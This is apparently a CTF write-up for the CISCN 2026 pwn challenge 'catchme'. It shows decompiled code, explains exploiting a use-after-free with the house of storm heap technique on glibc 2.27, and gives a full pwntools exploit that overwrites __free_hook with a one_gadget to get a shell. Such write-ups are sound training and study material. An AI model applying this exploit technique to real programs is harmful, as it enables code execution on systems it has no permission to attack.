---
title: CISCN-2026-pwn 题解
date: 2026-04-23 12:37:00
tags: 
    - pwn
    - CISCN2026
    - WriteUp
    - heap
    - house of storm
    - onegadget
categories: Contest
---
# 半决赛

## catchme

### checksec

```c
[*] '/home/RatherHard/CTF-pwn/ciscn/catchme/catchme'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

### IDA

#### main

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  initbuf(a1, a2, a3);
  while ( 1 )
  {
    switch ( (unsigned __int8)menu() )
    {
      case '1':
        allocate();
        break;
      case '2':
        delete();
        break;
      case '3':
        leak();
        break;
      case '4':
        edit();
        break;
      case '5':
        exit(-1);
      case '6':
        clear();
        break;
      default:
        puts("invalid operation");
        break;
    }
  }
}
```

#### allocate

```c
__int64 allocate()
{
  int i; // [rsp+8h] [rbp-18h]
  int v2; // [rsp+Ch] [rbp-14h]
  char nptr[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  for ( i = 0; i <= 4 && shelter[i]; ++i )
    ;
  if ( i > 4 )
  {
    puts("shelter is full");
    return 0xFFFFFFFFLL;
  }
  puts("choose your creature type");
  puts("(1)fox");
  puts("(2)hawk");
  puts("(3)otter");
  myread(nptr);
  v2 = atoi(nptr);
  switch ( v2 )
  {
    case 1:
      shelter[i] = malloc(0x430u);
      puts("a fox joins your shelter");
      break;
    case 2:
      shelter[i] = malloc(0x440u);
      puts("a hawk joins your shelter");
      break;
    case 3:
      shelter[i] = calloc(1u, 0x48u);
      puts("an otter joins your shelter");
      break;
    default:
      puts("invalid operation");
      return 0xFFFFFFFFLL;
  }
  printf(
    "token(1):%lx\ttoken(2):%lx\n",
    shelter[i] & 0xFFFLL,
    (unsigned __int8)((unsigned __int16)WORD2(shelter[i]) >> 8));
  return 0;
}
```

#### delete

```c
__int64 delete()
{
  unsigned int v1; // [rsp+Ch] [rbp-14h]
  char nptr[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("index:");
  myread(nptr);
  v1 = atoi(nptr);
  if ( v1 <= 4 && shelter[v1] )
  {
    free((void *)shelter[v1]);
    return 0;
  }
  else
  {
    puts("invalid operation");
    return 0xFFFFFFFFLL;
  }
}
```

#### leak

```c
__int64 leak()
{
  unsigned int v1; // [rsp+Ch] [rbp-14h]
  char nptr[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("inspection pass: one time only");
  if ( leak_counts )
  {
    leak_counts = 0;
    puts("index:");
    myread(nptr);
    v1 = atoi(nptr);
    if ( v1 <= 4 && shelter[v1] )
    {
      printf("tag:%s\n", (const char *)(shelter[v1] + 8LL));
      return 0;
    }
    else
    {
      puts("invalid operation");
      return 0xFFFFFFFFLL;
    }
  }
  else
  {
    puts("no more permissions");
    return 0xFFFFFFFFLL;
  }
}
```

#### edit

```c
__int64 edit()
{
  unsigned int v1; // [rsp+4h] [rbp-1Ch]
  __int64 v2; // [rsp+8h] [rbp-18h]
  char nptr[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( edit_counts <= 0 )
  {
    puts("no more permissions");
    return 0xFFFFFFFFLL;
  }
  else
  {
    puts("you can retag at most three times");
    --edit_counts;
    puts("index:");
    myread(nptr);
    v1 = atoi(nptr);
    if ( v1 <= 4 && shelter[v1] )
    {
      v2 = shelter[v1];
      puts("set tag:");
      read(0, (void *)(v2 + 8), 0x18u);
      return 0;
    }
    else
    {
      puts("invalid operation");
      return 0xFFFFFFFFLL;
    }
  }
}
```

#### clear

```c
__int64 clear()
{
  unsigned int v1; // [rsp+Ch] [rbp-14h]
  char nptr[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("index:");
  myread(nptr);
  v1 = atoi(nptr);
  if ( v1 <= 4 )
  {
    shelter[v1] = 0;
    puts("record cleared");
    return 0;
  }
  else
  {
    puts("invalid operation");
    return 0xFFFFFFFFLL;
  }
}
```

### 攻击思路

有明显的 UAF 漏洞

拥有 0x440 / 0x450 / 0x50 大小的 chunk

0x50 大小的走 calloc ，不使用 tcache 

glibc 版本为 2.27

所以这题目打的是 house of storm

但是有点小坑， 如果最后回弹 fake chunk 时未填满 0x50 的 tcache 会导致 tcache stashing unlink 触发导致回弹失败，并在又一次的 bins 的处理循环中崩溃，，，

打完 house of storm 后劫持 __free_hook 打 onegadget 即可

刚好这道题可以直接打 onegadget ，如果上下文环境不满足的话，得劫持 __malloc_hook 和 __realloc_hook （两个连着的）去微调栈帧了

### house of storm

在一次 malloc 中同时执行一次 unsortedbin attack 和两次 largebin attack 伪造出一个 0x50 大小的 fake chunk （size 为 0x55）

利用条件：

- glibc 版本小于等于 2.28
- 布局两个属于 largesize 的 chunk ，分别放在 unsortedbin 和 largebin 中，前者的 size 要比后者的大，且两个 chunk 要属于同一个 index

具体操作：

- unsortedchunk->bk = target1
- largechunk->bk = target2
- largechunk->bk_nextsize = target3

产生效果：

- unsorted_chunks(av) = target1
- target1->fd = unsorted_chunks(av)
- target2->fd = unsortedchunk
- target3->fd_nextsize = unsortedchunk

由于不进行链表完整性检查，直接伪造：

- unsortedchunk->bk = target
- largechunk->bk = target + 0x8
- largechunk->bk_nextsize = target - 0x18 - 5

产生效果：

- unsorted_chunks(av) = target
- target->fd = unsorted_chunks(av)
- target->bk = unsortedchunk
- target->size = 0x55 / 0x56

target 就是伪造的 chunk ，接下来只要申请一个 0x50 大小的 chunk 就能拿到 target 的写入权限

但是需要多试几次，如果 size 为 0x56 的话会崩掉，必须是 0x55 ，要求 NON_MAIN_ARENA 位为 0

### exp

```c
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

file = './catchme_patched'
elf = ELF(file)
libc = ELF('./libc.so.6')

target = 'challenge.imxbt.cn'
port = 32219

if debug:
    p = process(file)
else:
    p = remote(target, port)

io = p

def dbg(cmd = ''):
    if debug:
        gdb.attach(p, gdbscript = cmd)

s       = lambda data           :p.send(data)
sl      = lambda data           :p.sendline(data)
sa      = lambda x, data        :p.sendafter(x, data)
sla     = lambda x, data        :p.sendlineafter(x, data)
r       = lambda num=4096       :p.recv(num)
rl      = lambda num=4096       :p.recvline(num)
ru      = lambda x              :p.recvuntil(x)
itr     = lambda                :p.interactive()
uu32    = lambda data           :u32(data.ljust(4, b'\x00'))
uu64    = lambda data           :u64(data.ljust(8, b'\x00'))
uru64   = lambda                :uu64(ru(b'\x7f')[-6:])
leak    = lambda name           :log.success(name + ' = ' + hex(eval(name)))

def allocate(idx):
    sla(b'>>\n', b'1')
    sla(b'(3)otter\n', str(idx).encode())

def delete(idx):
    sla(b'>>\n', b'2')
    sla(b'index:\n', str(idx).encode())

def leak_once(idx):
    sla(b'>>\n', b'3')
    sla(b'index:\n', str(idx).encode())

def edit(idx, content):
    sla(b'>>\n', b'4')
    sla(b'index:\n', str(idx).encode())
    sa(b'tag:\n', content)

def exit():
    sla(b'>>\n', b'5')

def clear(idx):
    sla(b'>>\n', b'6')
    sla(b'index:\n', str(idx).encode())

allocate(1)     # build bin
for _ in range(7):
    allocate(3)
    delete(1)
    clear(1)
allocate(3)
delete(0)
allocate(2)
allocate(2)
delete(2)

leak_once(0)        # leak libc
ru(b'tag:')
bk_leak = uu64(r(6))
libc.address = bk_leak - 0x3ec0a0
leak('libc.address')

fake_chunk_base = libc.symbols['__free_hook'] - 0x18        # house of storm
edit(2, p64(fake_chunk_base) + p64(0) + p64(0))
edit(0, p64(fake_chunk_base + 0x8) + p64(0) + p64(fake_chunk_base - 0x20 + 0x3))
allocate(3)

edit(4, p64(libc.address + 0x4f302) + p64(0) + p64(0))      # get shell
delete(1)

itr()
```